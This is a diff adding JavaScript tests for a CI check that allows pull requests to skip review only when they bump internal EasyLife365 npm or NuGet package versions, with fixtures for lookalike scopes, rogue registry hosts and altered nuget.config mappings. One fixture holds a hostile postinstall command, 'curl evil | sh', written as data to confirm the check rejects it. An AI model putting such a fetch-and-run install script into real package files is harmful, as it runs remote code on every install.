@@ -1,6 +1,6 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
-import { isDependencyOnlyChange, commitsAreTrusted, FILES_API_CAP, COMMITS_CAP, APP_NAME, APP_EMAIL } from './dependency-only.mjs';
+import { isDependencyOnlyChange, isInternalBumpOnly, nugetConfigPinsInternal, commitsAreTrusted, FILES_API_CAP, COMMITS_CAP, APP_NAME, APP_EMAIL } from './dependency-only.mjs';
 
 const f = (filename, extra = {}) => ({ filename, status: 'modified', ...extra });
 const wf = (patch, extra = {}) => f('.github/workflows/ci.yml', { patch, ...extra });
@@ -264,4 +264,221 @@ test('pairs must be adjacent within a hunk', () => {
   assert.equal(exempt([wf(two)]), true);
   const twoRuns = '@@ -1,5 +1,5 @@\n-      - uses: a/b@v1\n+      - uses: a/b@v2\n ctx\n-      - uses: c/d@v1\n+      - uses: c/d@v2';
   assert.equal(exempt([wf(twoRuns)]), true);
+});
+
+// ---- isInternalBumpOnly (patches mirror EasyLife365-Collaboration#5153 and #4885) ----
+// The files API gives every file its additions and deletions; the fixtures get them from their own patch.
+const counted = (file) => {
+  if (!file || typeof file.patch !== 'string') return file;
+  const lines = file.patch.split('\n');
+  return { additions: lines.filter((l) => l.startsWith('+')).length, deletions: lines.filter((l) => l.startsWith('-')).length, ...file };
+};
+const internal = (files) => isInternalBumpOnly(Array.isArray(files) ? files.map(counted) : files).internalBump;
+const sha = (c) => c.repeat(40);
+const pkg = (o, n, { indent = '    ', comma = ',', name = '@easylife365/react' } = {}) =>
+  f('package.json', { patch: `@@ -51,7 +51,7 @@\n   "dependencies": {\n-${indent}"${name}": "${o}"${comma}\n+${indent}"${name}": "${n}"${comma}\n     "@fortawesome/fontawesome-svg-core": "7.3.1",` });
+const entry = (sign, v, { name = '@easylife365/react', header = true, spec = v, host = 'npm.pkg.github.com/download', hash = 'a' } = {}) =>
+  [
+    header ? `${sign}"${name}@${spec}":` : null,
+    `${sign}  version "${v}"`,
+    `${sign}  resolved "https://${host}/${name}/${v}/${sha(hash)}#${sha(hash)}"`,
+    `${sign}  integrity sha512-/rWz92ul/ZpYX9/LxTEBKhuCair+RFKVC54elXlOa+KbSMPLDLZyAS06FgKSJhyuvmBawP+1esreG6ksAnjKqA==`,
+  ].filter((l) => l !== null).join('\n');
+const lock = (o, n, opts = {}) =>
+  f('yarn.lock', { patch: `@@ -388,10 +388,10 @@\n   integrity sha512-OoKo==\n \n${entry('-', o, opts)}\n${entry('+', n, { ...opts, hash: 'b' })}\n   dependencies:\n     dompurify "3.4.17"` });
+const csproj = (o, n, { name = 'EL.Core.API', element = 'PackageReference', path = 'Core/EL.API/EL.API.csproj' } = {}) =>
+  f(path, { patch: `@@ -10,3 +10,3 @@\n   <ItemGroup>\n-    <${element} Include="${name}" Version="${o}" />\n+    <${element} Include="${name}" Version="${n}" />\n   </ItemGroup>` });
+
+test('internal bump: the React bump of package.json files and the yarn.lock entry passes', () => {
+  assert.equal(internal([f('Shared/x/package.json', { patch: pkg('0.15.3', '0.15.4', { comma: '' }).patch }), pkg('0.15.3', '0.15.4'), lock('0.15.3', '0.15.4')]), true);
+});
+
+test('internal bump: a caret range moves with both lock headers; an entry without a header change passes', () => {
+  const both = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { spec: '^0.15.3' })}\n${entry('+', '0.16.0', { spec: '^0.16.0', hash: 'b' })}` });
+  assert.equal(internal([pkg('^0.15.3', '^0.16.0'), both]), true);
+  const stale = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { spec: '^0.15.3' })}\n${entry('+', '0.16.0', { spec: '^0.15.3', hash: 'b' })}` });
+  assert.equal(internal([stale]), false);
+  const prefix = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { spec: '^0.15.3' })}\n${entry('+', '0.16.0', { spec: '0.16.0', hash: 'b' })}` });
+  assert.equal(internal([prefix]), false);
+  assert.equal(internal([lock('0.15.3', '0.15.4', { header: false })]), true);
+});
+
+test('internal bump: EL.* PackageReference and PackageVersion bumps pass, CRLF lines too', () => {
+  assert.equal(internal([csproj('5.15.1', '5.17.1'), csproj('5.15.1', '5.17.1', { element: 'PackageVersion', path: 'Directory.Packages.props' })]), true);
+  const crlf = f('a.csproj', { patch: '@@ -1 +1 @@\n-    <PackageReference Include="EL.Core" Version="5.15.1" />\r\n+    <PackageReference Include="EL.Core" Version="5.17.1" />\r' });
+  assert.equal(internal([crlf]), true);
+});
+
+test('internal bump: a lower, equal or prerelease version is reviewed', () => {
+  assert.equal(internal([pkg('0.15.4', '0.15.3')]), false);
+  assert.equal(internal([pkg('0.15.4', '0.15.4')]), false);
+  assert.equal(internal([pkg('0.15.4', '0.16.0-collab5153')]), false);
+  assert.equal(internal([csproj('5.17.1', '5.15.1')]), false);
+  assert.equal(internal([csproj('5.15.1', '5.17.1-core12')]), false);
+  assert.equal(internal([lock('0.15.4', '0.15.3')]), false);
+  assert.equal(internal([pkg('0.9.0', '0.10.0')]), true, 'versions compare as numbers, not text');
+});
+
+test('internal bump: another package, another scope or a lookalike is reviewed', () => {
+  assert.equal(internal([pkg('7.3.1', '7.4.0', { name: '@fortawesome/fontawesome-svg-core' })]), false);
+  assert.equal(internal([pkg('1.0.0', '1.0.1', { name: '@easylife365x/react' })]), false);
+  assert.equal(internal([csproj('1.0.0', '1.0.1', { name: 'Newtonsoft.Json' })]), false);
+  assert.equal(internal([csproj('1.0.0', '1.0.1', { name: 'ELX.Core' })]), false);
+});
+
+test('internal bump: a renamed package, a changed range prefix, indent or comma is reviewed', () => {
+  const renamed = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+    "@easylife365/core": "0.15.4",' });
+  assert.equal(internal([renamed]), false);
+  assert.equal(internal([pkg('0.15.3', '^0.15.4')]), false);
+  const indent = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+  "@easylife365/react": "0.15.4",' });
+  assert.equal(internal([indent]), false);
+  const comma = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+    "@easylife365/react": "0.15.4"' });
+  assert.equal(internal([comma]), false);
+});
+
+test('internal bump: any other changed line in package.json is reviewed', () => {
+  const script = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/react": "0.15.3",\n-    "postinstall": "yarn build"\n+    "@easylife365/react": "0.15.4",\n+    "postinstall": "curl evil | sh"' });
+  assert.equal(internal([script]), false);
+  const added = f('package.json', { patch: '@@ -1,1 +1,2 @@\n ctx\n+    "@easylife365/react": "0.15.4",' });
+  assert.equal(internal([added]), false);
+  const removed = f('package.json', { patch: '@@ -1,2 +1,1 @@\n ctx\n-    "@easylife365/react": "0.15.3",' });
+  assert.equal(internal([removed]), false);
+  const interleaved = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/a": "1.0.0",\n+    "@easylife365/a": "1.0.1",\n-    "@easylife365/b": "1.0.0",\n+    "@easylife365/b": "1.0.1",' });
+  assert.equal(internal([interleaved]), false);
+});
+
+test('internal bump: the lock entry must stay on GitHub Packages and keep its dependency list', () => {
+  assert.equal(internal([lock('0.15.3', '0.15.4', { host: 'registry.yarnpkg.com' })]), false);
+  assert.equal(internal([lock('0.15.3', '0.15.4', { host: 'npm.pkg.github.com.evil.io/download' })]), false);
+  const deps = f('yarn.lock', { patch: `@@ -1,6 +1,6 @@\n${entry('-', '0.15.3')}\n${entry('+', '0.15.4', { hash: 'b' })}\n   dependencies:\n-    dompurify "3.4.17"\n+    dompurify "3.5.0"` });
+  assert.equal(internal([deps]), false);
+  const newEntry = f('yarn.lock', { patch: `@@ -1,4 +1,9 @@\n${entry('-', '0.15.3')}\n${entry('+', '0.15.4', { hash: 'b' })}\n \n+"left-pad@1.3.0":\n+  version "1.3.0"\n+  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#x"\n+  integrity sha512-a==` });
+  assert.equal(internal([newEntry]), false);
+});
+
+test('internal bump: a lock run whose version, resolved and header disagree is reviewed', () => {
+  const mismatch = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3')}\n+"@easylife365/react@0.15.4":\n+  version "0.15.4"\n+  resolved "https://npm.pkg.github.com/download/@easylife365/react/0.15.5/${sha('b')}#${sha('b')}"\n+  integrity sha512-a==` });
+  assert.equal(internal([mismatch]), false);
+  const otherName = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3')}\n${entry('+', '0.15.4', { name: '@easylife365/core', hash: 'b' })}` });
+  assert.equal(internal([otherName]), false);
+  const headerOnOneSide = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3', { header: false })}\n${entry('+', '0.15.4', { hash: 'b' })}` });
+  assert.equal(internal([headerOnOneSide]), false);
+});
+
+test('internal bump: any other file, a missing patch, a rename or a new file is reviewed', () => {
+  assert.equal(internal([pkg('0.15.3', '0.15.4'), f('AGENTS.md', { patch: '@@ -1 +1 @@\n-Core 5.15.1\n+Core 5.17.1' })]), false);
+  assert.equal(internal([f('package.json')]), false);
+  assert.equal(internal([{ ...pkg('0.15.3', '0.15.4'), status: 'added' }]), false);
+  assert.equal(internal([{ ...pkg('0.15.3', '0.15.4'), status: 'renamed', previous_filename: 'x/package.json' }]), false);
+  assert.equal(internal([{ ...csproj('1.0.0', '1.0.1'), filename: 'nuget.config' }]), false);
+  assert.equal(internal([f('package.json', { patch: '@@ -1,2 +1,2 @@\n ctx\n ctx' })]), false);
+});
+
+test('internal bump: empty, non-array, nameless and truncated listings are reviewed', () => {
+  assert.equal(internal(null), false);
+  assert.equal(internal([]), false);
+  assert.equal(internal([null]), false);
+  assert.equal(internal(Array.from({ length: FILES_API_CAP }, () => pkg('0.15.3', '0.15.4'))), false);
+  assert.deepEqual(isInternalBumpOnly([pkg('0.15.3', '0.15.4'), f('src/a.ts', { patch: '' })].map(counted)), { internalBump: false, offending: 'src/a.ts' });
+});
+
+test('internal bump: a patch that does not add up to the file counts (cut off, or no counts) is reviewed', () => {
+  const file = counted(pkg('0.15.3', '0.15.4'));
+  assert.equal(isInternalBumpOnly([file]).internalBump, true);
+  assert.equal(isInternalBumpOnly([{ ...file, additions: 2 }]).internalBump, false);
+  assert.equal(isInternalBumpOnly([{ ...file, deletions: 0 }]).internalBump, false);
+  const { additions, deletions, ...noCounts } = file;
+  assert.equal(isInternalBumpOnly([noCounts]).internalBump, false);
+});
+
+test('internal bump: says when a NuGet file moved, so the caller checks nuget.config', () => {
+  assert.deepEqual(isInternalBumpOnly([pkg('0.15.3', '0.15.4'), lock('0.15.3', '0.15.4')].map(counted)), { internalBump: true, nuget: false });
+  assert.deepEqual(isInternalBumpOnly([csproj('5.15.1', '5.17.1')].map(counted)), { internalBump: true, nuget: true });
+  assert.equal(isInternalBumpOnly([csproj('5.15.1', '5.17.1', { path: 'Directory.Packages.props', element: 'PackageVersion' })].map(counted)).nuget, true);
+});
+
+test('internal bump: several adjacent lines in one run pass when each pair is a bump', () => {
+  const two = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/react": "0.15.3",\n-    "@easylife365/react-core": "0.15.3",\n+    "@easylife365/react": "0.15.4",\n+    "@easylife365/react-core": "0.15.4",' });
+  assert.equal(internal([two]), true);
+  const swapped = f('package.json', { patch: '@@ -1,2 +1,2 @@\n-    "@easylife365/react": "0.15.3",\n-    "@easylife365/react-core": "0.15.3",\n+    "@easylife365/react-core": "0.15.4",\n+    "@easylife365/react": "0.15.4",' });
+  assert.equal(internal([swapped]), false);
+  const nuget = f('a.csproj', { patch: '@@ -1,2 +1,2 @@\n-    <PackageReference Include="EL.Core" Version="5.15.1" />\n-    <PackageReference Include="EL.Core.API" Version="5.15.1" />\n+    <PackageReference Include="EL.Core" Version="5.17.1" />\n+    <PackageReference Include="EL.Core.API" Version="5.17.1" />' });
+  assert.equal(internal([nuget]), true);
+});
+
+test('internal bump: the lock hash in the path and the fragment must be the same', () => {
+  const other = f('yarn.lock', { patch: `@@ -1,4 +1,4 @@\n${entry('-', '0.15.3')}\n+"@easylife365/react@0.15.4":\n+  version "0.15.4"\n+  resolved "https://npm.pkg.github.com/download/@easylife365/react/0.15.4/${sha('b')}#${sha('c')}"\n+  integrity sha512-a==` });
+  assert.equal(internal([other]), false);
+});
+
+test('internal bump: only spaces and tabs count as whitespace', () => {
+  const nbsp = f('package.json', { patch: '@@ -1 +1 @@\n-    "@easylife365/react": "0.15.3",\n+    "@easylife365/react": "0.15.4",' });
+  assert.equal(internal([nbsp]), false);
+  const extraAttribute = f('a.csproj', { patch: '@@ -1 +1 @@\n-    <PackageReference Include="EL.Core" Version="5.15.1" PrivateAssets="all" />\n+    <PackageReference Include="EL.Core" Version="5.17.1" PrivateAssets="all" />' });
+  assert.equal(internal([extraAttribute]), false);
+});
+
+// ---- nugetConfigPinsInternal (the shape of EasyLife365-Collaboration/nuget.config) ----
+const nugetConfig = ({ mapping = true, elSource = 'Github', extra = '', githubUrl = 'https://nuget.pkg.github.com/EasyLife365/index.json' } = {}) => `<?xml version="1.0" encoding="utf-8"?>
+<configuration>
+  <packageSources>
+    <!-- a comment with <packageSourceMapping> in it is ignored -->
+    <clear />
+    <add key="NuGet official package source" value="https://api.nuget.org/v3/index.json" />
+    <add key="Github" value="${githubUrl}" />
+  </packageSources>
+  ${mapping ? `<packageSourceMapping>
+    <packageSource key="${elSource}">
+      <package pattern="EL.*" />
+    </packageSource>
+    <packageSource key="NuGet official package source">
+      <package pattern="*" />${extra}
+    </packageSource>
+  </packageSourceMapping>` : ''}
+</configuration>`;
+
+test('nuget.config: EL.* mapped to the EasyLife365 feed passes, in every file', () => {
+  assert.equal(nugetConfigPinsInternal([nugetConfig()]), true);
+  assert.equal(nugetConfigPinsInternal([nugetConfig(), nugetConfig()]), true);
+});
+
+test('nuget.config: no mapping, EL.* on nuget.org, another feed URL or an EL. pattern on nuget.org fails', () => {
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ mapping: false })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig(), nugetConfig({ mapping: false })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ elSource: 'NuGet official package source' })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ githubUrl: 'https://nuget.pkg.github.com/Other/index.json' })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: '\n      <package pattern="EL.Core.*" />' })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: '\n      <package pattern="el.core.api" />' })]), false);
+});
+
+test('nuget.config: a shape the patterns would skip fails (quotes, attribute order or extra attribute, a second block)', () => {
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: "\n    </packageSource>\n    <packageSource key='NuGet official package source'>\n      <package pattern=\"EL.Core\" />" })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: '\n    </packageSource>\n    <packageSource key="NuGet official package source" x="1">\n      <package pattern="EL.Core" />' })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig({ extra: '\n      <package pattern="EL.Core" version="1" />' })]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig().replace('<clear />', '<add value="https://api.nuget.org/v3/index.json" key="Github" />')]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig().replace('</configuration>', '<packageSources>\n  <add key="x" value="y" />\n</packageSources>\n</configuration>')]), false);
+});
+
+test('internal bump: @easylife365/pricing-calculator is not an internal package (its own job publishes it)', () => {
+  assert.equal(internal([pkg('1.0.0', '1.0.1', { name: '@easylife365/pricing-calculator' })]), false);
+  assert.equal(internal([lock('1.0.0', '1.0.1', { name: '@easylife365/pricing-calculator' })]), false);
+  assert.equal(internal([pkg('1.0.0', '1.0.1', { name: '@easylife365/pricing-calculator-x' })]), true, 'only that exact name');
+});
+
+test('internal bump: on a hotfix/ base only a higher patch of the same MAJOR.MINOR passes', () => {
+  const patchOnly = (files) => isInternalBumpOnly(files.map(counted), { patchOnly: true }).internalBump;
+  assert.equal(patchOnly([pkg('0.15.3', '0.15.4'), lock('0.15.3', '0.15.4')]), true);
+  assert.equal(patchOnly([pkg('0.15.3', '0.16.0')]), false);
+  assert.equal(patchOnly([lock('0.15.3', '0.16.0')]), false);
+  assert.equal(patchOnly([csproj('5.15.1', '5.15.2')]), true);
+  assert.equal(patchOnly([csproj('5.15.1', '6.15.2')]), false);
+  assert.equal(patchOnly([csproj('5.15.1', '5.15.1')]), false);
+});
+
+test('nuget.config: a clear in the mapping, a source defined twice, no file or not text fails', () => {
+  assert.equal(nugetConfigPinsInternal([nugetConfig().replace('<packageSourceMapping>\n', '<packageSourceMapping>\n    <clear />\n')]), false);
+  assert.equal(nugetConfigPinsInternal([nugetConfig().replace('<clear />', '<add key="Github" value="https://api.nuget.org/v3/index.json" />')]), false);
+  assert.equal(nugetConfigPinsInternal([]), false);
+  assert.equal(nugetConfigPinsInternal(null), false);
+  assert.equal(nugetConfigPinsInternal([null]), false);
 });
